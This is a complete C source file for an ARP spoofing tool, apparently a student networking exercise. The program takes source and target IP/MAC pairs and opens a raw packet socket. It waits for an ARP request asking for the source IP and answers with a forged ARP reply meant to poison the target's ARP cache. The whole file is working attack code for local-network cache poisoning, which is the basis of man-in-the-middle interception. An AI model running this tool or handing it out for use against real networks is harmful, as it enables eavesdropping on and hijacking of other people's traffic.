#include "utils.h"

typedef struct {
    char ip[16];              
    unsigned char mac[6];     
} Host;

volatile int running = 1;

void stop_program(int sig) {
    (void)sig;
    printf(RED "[❌] Exiting program...\n" RESET);
    running = 0;
}

int validate_ip(const char *ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr)) == 1;
}

int parse_mac(const char *mac_str, unsigned char *mac) {
    int i = 0, byte_index = 0, len = 0;
    while (mac_str[len]) len++;
    if (len != 17) return 0;

    while (mac_str[i] && byte_index < 6) {
        if (!ft_ishexdigit(mac_str[i]) || !ft_ishexdigit(mac_str[i+1]))
            return 0;
        mac[byte_index] = (ft_hexchar_to_value(mac_str[i]) << 4) |
                          ft_hexchar_to_value(mac_str[i+1]);
        byte_index++;
        i += 2;
        if (byte_index < 6) {
            if (mac_str[i] != ':') return 0;
            i++;
        }
    }
    return (byte_index == 6 && mac_str[i] == '\0');
}

void format_mac(const unsigned char *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

char *find_interface() {
    struct ifaddrs *ifaddr, *ifa;
    static char interface[IFNAMSIZ];

    if (getifaddrs(&ifaddr) == -1) {
        fprintf(stderr, RED "[❌] getifaddrs: %s\n" RESET, strerror(errno));
        return NULL;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET &&
            !(ifa->ifa_flags & IFF_LOOPBACK)) {
            ft_strncpy(interface, ifa->ifa_name, IFNAMSIZ);
            freeifaddrs(ifaddr);
            return interface;
        }
    }
    freeifaddrs(ifaddr);
    return NULL;
}

void send_arp_reply(int sockfd, Host *source, Host *target, const char *interface) {
    unsigned char buffer[42];
    struct ether_header *eth = (struct ether_header *) buffer;
    struct ether_arp *arp = (struct ether_arp *) (buffer + 14);

    ft_memcpy(eth->ether_shost, source->mac, 6);
    ft_memcpy(eth->ether_dhost, target->mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

    ft_memcpy(arp->arp_sha, source->mac, 6);
    inet_pton(AF_INET, source->ip, arp->arp_spa);
    ft_memcpy(arp->arp_tha, target->mac, 6);
    inet_pton(AF_INET, target->ip, arp->arp_tpa);

    struct sockaddr_ll sa;
    ft_memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = if_nametoindex(interface);
    sa.sll_halen = ETH_ALEN;
    ft_memcpy(sa.sll_addr, target->mac, 6);

    printf(MAGENTA "[📤] Sending ARP reply as spoofed source (%s)...\n" RESET, source->ip);
    
    if (sendto(sockfd, buffer, 42, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, RED "[❌] sendto: %s\n" RESET, strerror(errno));
    } else {
        printf(GREEN "[✅] ARP reply sent! 🧠 Check target's ARP cache.\n" RESET);
    }
}

void wait_and_spoof(int sockfd, Host *source, Host *target, const char *interface) {
    unsigned char buffer[65536];
    struct ether_header *eth;
    struct ether_arp *arp;

    printf(YELLOW "[👂] Listening for ARP requests to spoof %s...\n" RESET, source->ip);

    while (running) {
        ssize_t length = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
        if (length < 0) continue;

        eth = (struct ether_header*) buffer;

        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
            arp = (struct ether_arp*)(buffer + 14);

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) {
                char requested_ip[16];
                inet_ntop(AF_INET, arp->arp_tpa, requested_ip, sizeof(requested_ip));

                if (ft_strcmp(requested_ip, source->ip) == 0) {
                    char sender_mac[18];
                    format_mac(arp->arp_sha, sender_mac);
                    char sender_ip[16];
                    inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));

                    printf(CYAN "[🔍] ARP Request from %s (%s)\n" RESET, sender_ip, sender_mac);

                    send_arp_reply(sockfd, source, target, interface);
                    break;
                }
            }
        }
    }
}

int setup_hosts(int argc, char *argv[], Host *source, Host *target) {
    if (argc != 5) {
        fprintf(stderr, RED "Usage: %s <source_ip> <source_mac> <target_ip> <target_mac>\n" RESET, argv[0]);
        return -1;
    }

    ft_strncpy(source->ip, argv[1], 15);
    ft_strncpy(target->ip, argv[3], 15);

    if (!validate_ip(source->ip)) {
        fprintf(stderr, RED "[❌] Invalid IP: %s\n" RESET, source->ip);
        return -1;
    }
    if (!validate_ip(target->ip)) {
        fprintf(stderr, RED "[❌] Invalid IP: %s\n" RESET, target->ip);
        return -1;
    }
    if (!parse_mac(argv[2], source->mac)) {
        fprintf(stderr, RED "[❌] Invalid MAC: %s\n" RESET, argv[2]);
        return -1;
    }
    if (!parse_mac(argv[4], target->mac)) {
        fprintf(stderr, RED "[❌] Invalid MAC: %s\n" RESET, argv[4]);
        return -1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    Host source, target;
    char *interface;
    int sockfd;

    signal(SIGINT, stop_program);

    if (setup_hosts(argc, argv, &source, &target) == -1)
        return EXIT_FAILURE;

    interface = find_interface();
    if (!interface) {
        fprintf(stderr, RED "[❌] No suitable interface found.\n" RESET);
        return EXIT_FAILURE;
    }

    printf(GREEN "[✅] Interface selected: %s\n" RESET, interface);

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        fprintf(stderr, RED "[❌] socket: %s\n" RESET, strerror(errno));
        return EXIT_FAILURE;
    }

    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    wait_and_spoof(sockfd, &source, &target, interface);

    close(sockfd);
    return 0;
}
